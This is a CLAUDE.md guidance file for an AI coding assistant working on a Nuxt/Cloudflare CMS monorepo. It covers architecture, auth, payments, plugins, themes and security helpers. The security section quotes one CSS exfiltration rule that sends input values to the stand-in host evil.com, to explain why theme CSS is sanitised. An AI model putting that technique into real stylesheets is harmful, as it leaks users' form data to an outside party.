# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Commands

```bash
# Password hashing runs in a separate Worker (ARGON2 service binding) that `wrangler dev`
# does not start on its own — setup/login/registration all fail without it. Run once per
# session, in its own terminal, before `pnpm dev`:
#   cd workers/argon2-hasher && pnpm install && pnpm dev

# Dev server — runs `wrangler dev` under the hood (localhost:8787, D1 auto-provisioned).
# This is the only supported local dev workflow; there is no separate `nuxt dev` path.
pnpm dev

# Unit tests (Vitest — tests/unit/**)
pnpm test                                   # all packages
pnpm --filter @nuxflow/app test             # app only
pnpm --filter @nuxflow/app test:watch

# Integration tests (Vitest — tests/integration/**)
pnpm --filter @nuxflow/app test:integration
pnpm --filter @nuxflow/app test:integration:watch

# Run both unit and integration together
pnpm --filter @nuxflow/app test:all

# E2E tests (Playwright, requires running dev server)
pnpm test:e2e

# Type check and lint
pnpm typecheck
pnpm lint

# Database — D1 only. Migrations apply automatically on cold start; there is no
# manual migrate command.
pnpm --filter @nuxflow/db generate      # generate migration after schema change
pnpm --filter @nuxflow/db studio        # Drizzle Studio — point DB_LOCAL_PATH at the
                                         # local D1 sqlite file under apps/nuxflow/.wrangler/

# Build and deploy — run from apps/nuxflow; wrangler handles the build step automatically
cd apps/nuxflow && pnpm run deploy
```

**Always use `pnpm`, never `npm`.**

## Architecture

### Monorepo layout

```
apps/nuxflow/          # Main Nuxt 4 app (the CMS)
packages/canvas/       # Canvas page builder engine (blocks, editor, types) — @nuxflow/canvas
packages/db/           # Drizzle schema and migrations (D1-only — no client factory)
packages/cli/          # `nuxflow` CLI — scaffold, build, and deploy dynamic plugins/themes
themes/default/        # Default CSS theme
docs/                  # User-facing documentation (markdown)
```

`packages/db` is linked as a workspace dep; schema changes in `packages/db/src/schema/` are immediately visible to the app with no build step.

### Database layer

Cloudflare D1 is the only supported database — there is no alternate backend. `apps/nuxflow/server/utils/db.ts` — `useDb(event)` returns a Drizzle instance backed by the D1 binding (`event.context.cloudflare.env.DB`), and throws a clear error if no binding is present. It also checks `globalThis.__env__?.DB` so it works inside Nitro scheduled tasks where no H3 event is available. `packages/db` exports only the schema (`@nuxflow/db/schema`) — there is no client factory, since D1 instances can only be constructed from a live binding, not a URL/token pair.

**Migrations run automatically** on cold start via `server/middleware/00.migrate.ts`. SQL files are bundled into the Worker as server assets (`packages/db/migrations/`). Never hand-run migrations in production; just deploy. For schema changes: edit `packages/db/src/schema/*.ts`, run `pnpm --filter @nuxflow/db generate`, commit both the schema and the generated SQL. Some migrations (virtual FTS5 tables, triggers) can't be expressed in Drizzle's schema DSL and are hand-written directly as `.sql` files — see `migrations/0002_search_index.sql`.

Schema files in `packages/db/src/schema/`:

| File | Tables |
|---|---|
| `sites.ts` | `sites`, `site_settings` |
| `users.ts` | users, sessions, accounts, `user_site_roles` |
| `content.ts` | `content_types`, `content_items`, `content_revisions`, taxonomies |
| `media.ts` | media, folders |
| `forms.ts` | forms, submissions |
| `payments.ts` | membership tiers, subscriptions |
| `system.ts` | plugins, themes, audit logs, webhooks, `rate_limits`, FTS5 `search_index` (raw SQL, see migrations) |

### Search

`GET /api/v1/search` queries the `search_index` FTS5 virtual table (title + porter-stemmed body) and is kept in sync automatically by SQLite triggers on `content_items` (`AFTER INSERT/UPDATE/DELETE`, defined in `migrations/0002_search_index.sql`) — there is no application-level indexing code, so every write path (API, setup wizard seeding, demo reset) stays in sync for free. Only `status = 'published' AND visibility = 'public'` items are indexed; the indexed body is `COALESCE(excerpt, seo_description, '')`, not the full rendered content.

### Multi-site and request context

`server/middleware/02.multi-site.ts` resolves the current site from the `Host` header and sets:
- `event.context.siteId` — all DB queries must be scoped by this
- `event.context.siteStatus` — `'active' | 'maintenance' | 'suspended'`
- `event.context.setupCompleted`

**Single-site fallback:** if no site matches the incoming domain but exactly one site exists in the database, that site is used. In production this also self-heals by updating the stored domain to match the live request host — so sitemaps, invite links, and RSS feeds automatically correct after a domain migration.

**Adding additional sites:** the initial setup wizard (`/api/v1/setup/complete`) blocks with 409 if any site already exists — it is a one-time first-install flow only. Additional sites must be created via the super admin panel at `/admin/super/sites`. Sites created this way are blank shells with no seeded content types, homepage, or users; the super admin must configure them manually.

Setup and auth routes (`/api/v1/setup`, `/api/auth`) bypass multi-site resolution.

`server/middleware/01.d1-cache.ts` ensures the module-level D1 singleton in `db.ts` is always populated before auth routes run (auth config has no per-request event access).

### Auth and permissions

Auth is handled by Better Auth via `@onmax/nuxt-better-auth`. Sessions are read server-side via `requireUserSession(event)`.

**Permission helpers** in `server/utils/permissions.ts`:
- `requireAuth(event)` → `{ userId, role }` — validates session + looks up `user_site_roles` for the **current site**
- `requireRole(event, minimum)` — throws 403 if role rank is below minimum; **site-scoped**
- `requireSuperAdmin(event)` — checks for a `super_admin` role entry on **any site**, not just the current one

This cross-site vs site-scoped distinction matters: a super admin on site A automatically has super admin access when visiting site B's domain, but their effective role for content operations on site B defaults to `viewer` unless a `user_site_roles` row exists for that site.

`GET /api/v1/users/me` — returns `{ role, isSuperAdmin }` for the authenticated user. This is the only client-side way to get role information; the session object from `useUserSession()` only contains the users table fields.

Roles (ranked): `super_admin > admin > editor > author > member > viewer`

**API key auth** — `server/middleware/03.api-key-auth.ts` handles `Authorization: Bearer <key>` requests. On a valid key it sets `event.context.apiKeyUserId` and `event.context.apiKeyRole` (derived from `user_site_roles` for the current site). Routes that want to support headless API access should check these context fields in addition to session auth.

### Server route conventions

- Files use `[id].ts` (not `[id].js.ts`) — radix3 breaks param extraction with double extensions
- HTTP method is set via file suffix: `index.get.ts`, `index.post.ts`, `[id].patch.ts`, etc.
- All handlers validate input with Zod using `parseBody(event, schema)` or `parseQuery(event, schema)` from `server/utils/validate.ts`
- All mutations write an audit log via `writeAuditLog(event, userId, opts)` from `server/utils/audit.ts`
- IDs are generated with `ulid()` — never use `crypto.randomUUID()` or `node:crypto`
- Crypto operations (signing, hashing) use `globalThis.crypto.subtle` (Web Crypto API) — never `node:crypto`
- Use response helpers from `server/utils/response.ts`: `ok(data)`, `created(event, data)`, `noContent(event)`, `notFound()`, `forbidden()`, `conflict()`, `validationError()` — do not throw raw `createError` for these common cases

### Scheduled tasks

The pattern is a two-layer split:
- **`server/scheduled/`** — plain TypeScript modules containing the business logic as exported functions (e.g. `publishScheduled()`). These are not auto-discovered by Nitro.
- **`server/tasks/`** — thin `defineTask()` wrappers that import and call the logic functions. Nitro only discovers tasks from this directory.

Each file in `server/tasks/` corresponds to a task name registered in `nitro.scheduledTasks` in `nuxt.config.ts`. `experimental.tasks: true` must be set in the Nitro config for the task system to function. **Never add a file only to `server/scheduled/` and expect it to run on a schedule** — a matching `server/tasks/` wrapper is always required.

Tasks run without a request context. `useDb()` handles this by falling back to `globalThis.__env__?.DB`, which Nitro populates from the Cloudflare bindings object before firing the `cloudflare:scheduled` hook.

### Cloudflare-specific utilities

`server/utils/cf-env.ts` — typed accessors for Cloudflare bindings:
- `getCfBindings(event)` → `{ kv, loader }` — `PLUGIN_KV` and `LOADER` bindings
- `getAnalyticsEngine(event)` → `AE` Analytics Engine binding (null when not available)
- KV key conventions: `plugin:{siteId}:{pluginId}:server|client`, `theme:{siteId}:{themeId}:css|demo`
- `spawnPluginWorker(event, cacheId, getCode)` — spawns a dynamic plugin Worker via the `LOADER` binding

Dynamic plugins require the Cloudflare Workers Paid plan. Without it the `LOADER` binding is absent and dynamic plugins 503.

`server/utils/analytics.ts` — `trackPageView(event, { siteId, slug })` writes a data point to the `AE` binding (no-ops silently when binding is absent). Called automatically from the public pages API.

**`wrangler.toml` config notes:** custom domains must be declared via `[[routes]]` with `custom_domain = true` — if a domain is configured in the Cloudflare dashboard but not in `wrangler.toml`, Wrangler will warn about config drift and offer to remove it on every deploy. The `[assets]` section serves static files from `.output/public` and must be present for the built frontend to be served.

### Rate limiting

`server/utils/rate-limit.ts` — `rateLimit(event, opts)` is a two-tier check:
1. Isolate-level memory cache (instant, no DB)
2. DB upsert for cross-isolate consistency

### Settings system

`server/utils/settings.ts` — `resolveSetting(event, key, envKey?)` reads a site setting: DB first, falls back to `runtimeConfig[envKey]`. `saveSetting(event, key, value)` writes it. Keys listed in `SENSITIVE_SETTING_KEYS` (API keys, passwords) are automatically encrypted with AES-GCM using `betterAuthSecret` before writing and decrypted on read — never store or compare these in plaintext. There is a 30 s in-memory cache per isolate to avoid redundant DB reads; the cache is cleared automatically on save.

### Email

`server/utils/email.ts` — `sendEmail(event, msg)` dispatches email through the provider configured in site settings. Supported providers:
- `cloudflare` (**recommended**) — Cloudflare's native `send_email` Workers binding (`getEmailBinding()` in `cf-env.ts`). No third-party account or API key; requires `wrangler email sending enable <domain>` once per sending domain and a `[[send_email]]` binding named `EMAIL` in `wrangler.toml`.
- `resend`, `brevo`, `zepto` — third-party API-key providers.
- `smtp` — actually MailChannels, not generic SMTP. MailChannels' free anonymous relay for Cloudflare Workers requires an existing MailChannels account and DNS domain-lockdown records as of mid-2024 — most self-hosters won't have this. There is no host/user/pass to configure (MailChannels authorizes via sender-domain DNS, not credentials) — don't reintroduce those fields, they were removed because they never did anything.

Defaults to `console` log in dev when no provider is configured. Use `sendNotification()` from `server/utils/notify.ts` to persist an in-app notification and optionally send email in one call.

### Media system

**Provider abstraction** — `server/utils/media-providers/index.ts` exports `getActiveProvider(event): Promise<MediaProvider>`. Priority order: Cloudflare Images → S3 → Bunny → local (base64 data URI fallback). All three real providers are resolved identically via `resolveSetting(event, 'media.xxx', 'xxxRuntimeConfigKey')` — per-site DB setting first, `NUXT_`-prefixed env var fallback second — so a multi-site install can give different sites different buckets/zones, not just one global env var shared by every site. Configurable in Settings → Media, which writes to the same per-site settings `resolveSetting()` reads. The `MediaProvider` interface has `upload()`, `delete()`, and `getUrl()`. All image upload endpoints call `getActiveProvider()` rather than touching a specific storage SDK directly. The local fallback caps uploads at 512 KB (base64 stored directly in a D1 text column) and throws 413 above that — it's a last-resort path for when nothing else is configured, not a supported way to serve normal media.

**EXIF extraction** — `server/utils/exif.ts` exports `extractExif(buffer: ArrayBuffer): ExifData | null`. Pure Web APIs, zero dependencies. Reads IFD0 (Make, Model) and ExifIFD (exposure, ISO, focal length, flash, dateTimeOriginal) from JPEG APP1 segments. Returns `null` for non-JPEG files or images with no EXIF. The upload handler calls this after a successful provider upload and stores the result in `media.metadata` as `{ exif: {...} }`. Errors are swallowed so they never fail the upload.

**Cloudflare Stream video uploads** — `POST /api/v1/media/video/token` calls the Cloudflare Stream `direct_upload` API and returns `{ uploadUrl, uid }`. The browser then POSTs the file directly to `upload.cloudflarestream.com` via XHR (for progress events). The authenticated TUS endpoint lacks CORS headers and cannot be used from browsers. A 402 is returned when the account has no Stream minutes allocated (CF error code 10011) — the Workers Paid plan does not include Stream storage.

### AI providers

`server/utils/ai-sdk.ts` — `getAiSdkModel(event, quality)` returns an AI SDK `LanguageModel` for the provider configured in site settings (`ai.provider`). Supported providers: `openai`, `anthropic`, `gemini`, `deepseek`, `ollama`. Quality is `'fast'` (default) or `'smart'`, which selects a smaller vs larger model per provider. Returns `null` when the provider API key is missing — callers are expected to throw 503 on `null`. Use `aiErrorMessage(err)` to extract a user-friendly message from provider SDK errors.

This is the only AI abstraction in the codebase — every route calls `getAiSdkModel()` plus `generateText()`/`generateObject()` from the `ai` package directly (see `generate-content.post.ts` for the `generateText` pattern, `grammar.post.ts` for `generateObject` with a Zod schema). There used to be a second, hand-rolled `AiProvider` interface (`ai-providers/`) used only by the simple single-string-completion routes; it was removed since `getAiSdkModel` + `generateText` covers that exact case with no loss of capability — don't reintroduce a parallel abstraction for "simple" completions.

AI routes in `server/api/v1/ai/`:
- `POST /improve` — rewrites a text field (improve / shorten / expand / simplify). Called by the canvas `FieldRenderer` inline AI menu.
- `POST /bulk-alt-text` — queues AI-generated alt text for multiple media items. Returns a processing status; the admin media page polls until done.

### Payments and memberships

Payment providers are abstracted in `server/utils/payments/`:
- `StripeProvider` — products, prices, checkout sessions, billing portal, subscription cancel, webhook event construction
- `LemonSqueezyProvider` — products, variants, checkout, portal, cancellation, webhook HMAC verification
- `PaddleProvider` — subscription fetch/cancel and Ed25519 webhook verification. Checkout is **not** API-driven for Paddle — it redirects to a classic overlay checkout URL, so `PaddleProvider` has no `createCheckoutSession`/`createProduct` equivalent

All three `implements PaymentProvider` (`payments/types.ts`) for the one operation genuinely identical across all three: `cancelSubscription(subscriptionId)`. Checkout creation and product/price sync are deliberately **not** part of that shared interface — Stripe/LS drive them through their APIs, Paddle doesn't, so forcing a common shape there would misrepresent the difference rather than remove real duplication.

`server/utils/payments/webhook-sync.ts` — `upsertSubscriptionFromWebhook()` and `cancelSubscriptionFromWebhook()` hold the DB-write logic (tier lookup, existing-row check, insert/update, activation push) that used to be duplicated three times in the webhook handler. Each provider's webhook handler only parses its own raw payload into a `SubscriptionUpsert`/`SubscriptionCancellation` and calls the shared function — `pushOnActivation` is computed per-provider since each vocabulary differs on which specific event type should trigger a push (e.g. Lemon Squeezy/Paddle only push on their "created"/"activated" event, not "updated"/"resumed", even though those share the same upsert path).

`server/utils/payments/gate.ts` — `resolveContentGate(event, settings)` checks `settings.access` (`'public'`, `'members'`, `'tier:<tierId>'`) against the caller's active subscription. Returns `GateResult | null` (null = access granted). Used internally by the public pages API.

Membership tiers and subscriptions live in the core DB schema (`packages/db/src/schema/payments.ts`).

Routes under `/api/v1/memberships/`:
- `POST /checkout` → creates a provider checkout session, returns `{ url }`
- `POST /billing-portal` → opens the provider billing portal, returns `{ url }`
- `DELETE /api/v1/account/subscription` → cancels the caller's active subscription (skips provider API for free-tier subs whose `providerSubscriptionId` starts with `free_`)
- `POST /webhooks/[provider]` → Stripe/LS/Paddle webhook handler; upserts `subscriptions` rows and optionally sends a push notification via `push.events.payment_confirmation` setting

The public pages API returns **HTTP 402** with `{ gated: true, requiredTier, tiers }` when content requires a subscription the caller doesn't hold. `app/pages/[...slug].vue` catches this in `onResponseError` and renders `<Paywall :tiers="gated.tiers" />`. Member-only pages also set `Cache-Control: private` to prevent CDN caching.

### Plugin system

**Dynamic plugins** are third-party Workers stored in KV and spawned on demand. A plugin is a `nuxflow.plugin.json` manifest plus `src/server.ts` (a raw `{ fetch(request) }` Cloudflare Worker handler, served at `/_nuxflow/ext/{pluginId}/*`) and/or `src/client.ts` (exports a `register(app, registry, vue)` function that calls `registry.register(id, { component, definition, ... })` to add Canvas blocks — see `useBlockRegistry.ts`). Plugin authors are explicitly told not to import from `@nuxflow/*` and to inline their own copies of the small shared type shapes instead, so there is no shared SDK package for this — see `packages/cli/src/utils/scaffold.ts` for the exact generated contract. The server verifies Ed25519 signatures and SHA-256 checksums on install and on every request (`server/utils/plugin-signing.ts`).

### Canvas block system

Block definitions live in `packages/canvas/src/blocks/definitions.ts`. The file exports a `CANVAS_BLOCKS` array (all built-in blocks) plus two public functions:
- `registerBlockDefinition(def)` — appends to a module-level `_dynamicDefinitions` array. Called by dynamic plugins to register their block field schemas so the canvas settings panel can render them.
- `getBlockDefinition(id)` — searches `CANVAS_BLOCKS` first, then `_dynamicDefinitions`.

**`CanvasBlockDefinition`** (from `packages/canvas/src/types.ts`) has:
- `fields: FieldSchema[]` — each field has `type`, `key`, `label`, and optional `condition?: (props) => boolean` to hide the field based on sibling prop values. Use `condition` for dependent controls (e.g. focal-point sliders only when `fit === 'cover'`).
- Field types: `'text'`, `'textarea'`, `'richtext'`, `'number'`, `'color'`, `'select'`, `'toggle'`, `'image'`, `'images'` (JSON array of `{ url, alt }` objects), `'url'`, `'spacing'` (`{ top, right, bottom, left, unit }` object).
- `category` determines which section of the block picker shows the block: `'content'`, `'media'`, `'layout'`, `'cta'`, `'forms'`, `'advanced'`, `'commerce'`.
- `component: string` — globally-registered Vue component name resolved at render time.

**`NuxLightbox`** (`packages/canvas/src/blocks/NuxLightbox.vue`) — modal image viewer. Accepts `images: { url, alt }[]` and `initialIndex`. Supports keyboard navigation (←/→/Esc) and touch. Used by both `CanvasBlockImage` (single-image lightbox toggle) and `CanvasBlockGallery` (gallery with optional lightbox).

**`CanvasBlockGallery`** (`packages/canvas/src/blocks/CanvasBlockGallery.vue`) — responsive grid block with `columns` (2/3/4), `gap`, `rounded`, `lightbox`, and `padding` props. The `images` prop is a JSON string of `{ url, alt }[]`.

**Registering a new block**: add its `CanvasBlockDefinition` to `CANVAS_BLOCKS` in `definitions.ts`, create its `.vue` component in `packages/canvas/src/blocks/`, import and register the component globally in `nuxflow-plugin-components.ts`, and add a test case in `tests/unit/canvas-blocks.test.ts`.

**CLI** (`packages/cli`) — the `nuxflow` CLI is used by third-party plugin/theme authors:
- `nuxflow plugin create` — scaffold a new dynamic plugin
- `nuxflow plugin keygen` — generate an Ed25519 publisher keypair (private key stays local, public key embedded in `nuxflow.plugin.json`)
- `nuxflow plugin build` — bundle `src/server.ts` + `src/client.ts` to `dist/plugin.json`
- `nuxflow plugin deploy --site <url>` — sign and install a plugin on a live site
- `nuxflow plugin update --site <url>` — remove old version and reinstall
- `nuxflow theme` — analogous commands for custom themes

### Theme system

Themes are CSS files stored in KV (`theme:{siteId}:{themeId}:css`). The active theme's CSS is injected as an inline `<style data-nuxflow-theme>` block during SSR via the `render:html` hook in `server/plugins/theme-resolver.ts` — no extra HTTP round-trip and no flash on first paint.

`server/plugins/site-settings-resolver.ts` injects appearance settings into SSR HTML on the same hook:
- `theme.dark_mode` → blocking inline `<script>` that adds/removes the `dark` class before paint
- `theme.primary_color` → `--nuxflow-primary` CSS custom property (injected everywhere, including admin)
- `theme.font_sans` → `--nuxflow-font` CSS property + Google Fonts `<link>`; `'system'` skips injection

Admin pages skip dark-mode and font injection (the admin has its own colour-mode toggle).

### Security utilities

`server/utils/security.ts` — use these for any endpoint that fetches external URLs, processes archives, or stores theme CSS:
- `isSafeUrl(urlStr)` — SSRF guard; returns `false` for private/loopback IPv4, private IPv6, `localhost`, `.local`, `.internal`, and non-HTTP(S) schemes
- `validateZipArchive(data, maxUncompressedSize)` — parses the ZIP central directory without decompressing; throws 400 on path traversal (Zip Slip) and 413 on Zip Bomb; returns `{ fileCount, totalSize }`
- `sanitizeThemeCss(css)` — strips `url()`, `@import`, `expression()`, and `</style>` from theme CSS before it's stored or injected. Theme CSS never legitimately needs external resources (fonts/images go through dedicated settings), so these are stripped outright rather than allow-listed — this closes the CSS attribute-selector exfiltration technique (`input[value^="a"] { background: url(https://evil.com/?a) }` leaks DOM attribute values with no JS needed). Called from the single write chokepoint `putThemeCSS()` in `cf-env.ts` (covers all 3 upload/patch/customizer routes automatically) and again at SSR injection time in `theme-resolver.ts` (idempotent — retroactively protects CSS stored before this existed, no data migration needed).

### Frontend routing

Public pages are rendered by `app/pages/[...slug].vue`. The page fetches `/api/public/pages/:slug`, which first checks the `redirects` table (returning a 3xx if matched), then branches on content type:
- `content.type === 'canvas'` → full-width `<NuxBlock>`, blocks handle their own layout
- Otherwise → contained prose layout with featured image, author/date meta, `<NuxBlock>`, share buttons
- **402 response** → member-gated content; `onResponseError` captures `{ gated, requiredTier, tiers }` and renders `<Paywall>` instead of the page

Other public routes:
- `/blog` (`app/pages/blog/index.vue`) — paginated post index; fetches `GET /api/public/posts`
- `/search` (`app/pages/search.vue`) — FTS5 full-text search via `GET /api/v1/search`; no auth required
- `/[taxonomySlug]/[termSlug]` — taxonomy archive with pagination; fetches `GET /api/public/taxonomy/:taxonomy/:term`
- `/feed.xml` — RSS 2.0 feed with `<content:encoded>` full HTML for TipTap posts
- `/sitemap-images.xml` (`server/routes/sitemap-images.xml.ts`) — Google Image sitemap extension; lists all `image/%` media for the site with `<image:title>` (altText) and `<image:caption>`. Uses `seo.canonical_url` setting as the base URL. Cached for 1 hour.

`GET /api/public/pages/:slug` returns `{ ..., author: { name, image } | null, excerpt }` in addition to the base fields. The author is looked up from the `users` table via `contentItems.authorId`.

Admin pages live in `app/pages/admin/`. Super-admin-only pages (e.g. multi-site management) live under `app/pages/admin/super/` and are linked in the sidebar only when `/api/v1/users/me` returns `isSuperAdmin: true`. The super admin site-deletion API (`DELETE /api/v1/admin/sites/:id`) blocks deletion of the site currently being accessed (`event.context.siteId`). Pinia stores in `app/stores/` manage auth (`auth.ts`) and content (`content.ts`) state.

### App utilities (Vue-only scope)

`app/utils/render-tiptap.ts` — converts a TipTap/ProseMirror JSON document to an HTML string. **This file is scoped to the Vue app bundle and cannot be imported from Nitro server routes.** Server-side code (e.g. `server/routes/feed.xml.ts`) must contain its own serializer or use a shared package if one is added.

### Nuxt config notes

- `ssr: true` and `nitro.preset: 'cloudflare-module'` unconditionally — dev only ever runs through `wrangler dev`, which always performs a production-mode build, so there's no separate dev-mode code path to special-case. (The old NODE_ENV-conditional split existed because `nuxt dev` was previously also a supported dev path and its Vite dev-server pipeline crashed on Windows with a Named Pipe IPC bug in `@nuxt/vite-builder@4.4.2 + Vite 7.3.x` — see nuxt/nuxt#34727. That path no longer exists, so the workaround was removed with it. If `nuxt dev` is ever reintroduced, re-check whether that upstream bug is still live before dropping the conditional again.)
- `@opentelemetry/api` is stubbed via `nitro.alias` because Better Auth imports it optionally but it is not installed
- Migrations SQL files are bundled via `nitro.serverAssets`
- `nitro.experimental.tasks: true` is required for the `server/tasks/` system to function

### Integration test helpers

`apps/nuxflow/tests/helpers/` — shared utilities for integration tests:
- `db.ts` — `initTestDb()` / `teardownTestDb()` / `getCurrentTestDb()` — manages a real SQLite (libSQL) database per test file
- `event.ts` — `createMockEvent(overrides)` — builds a minimal H3 event with `siteId`, session, headers, and body
- `seed.ts` — one insert per table: `seedSite`, `seedUser`, `seedRole`, `seedContentType`, `seedContentItem`, `seedTier`, `seedSubscription`, `seedMedia`, `seedVideoAsset`, `seedSetting`

Integration tests mock `../../server/utils/db` to return `getCurrentTestDb()` and mock payment provider classes (Stripe/LS/Paddle) to avoid real network calls. They use `vitest.integration.config.ts` (separate from `vitest.config.ts` which covers unit tests only) and run sequentially via `pool: 'forks', singleFork: true` to prevent SQLite file conflicts.

## Commit convention

This project follows [Conventional Commits](https://www.conventionalcommits.org): `feat:`, `fix:`, `docs:`, `refactor:`, `test:`, `chore:`. Commitlint runs in CI.

## Git & Deployment Workflow

Before staging, committing, or pushing any changes to GitHub, **always** perform the following verification steps locally:
1. **Linter**: Run `pnpm lint` and ensure there are 0 ESLint errors.
2. **Typecheck**: Run `pnpm typecheck` and ensure the TypeScript compiler is 100% green.
3. **Unit Tests**: Run `pnpm test` to guarantee zero regressions on serverless routes or business logic.
4. **E2E Tests**: If modifying critical dashboard forms or routing logic, run E2E specs to ensure Edge Worker compatibility.
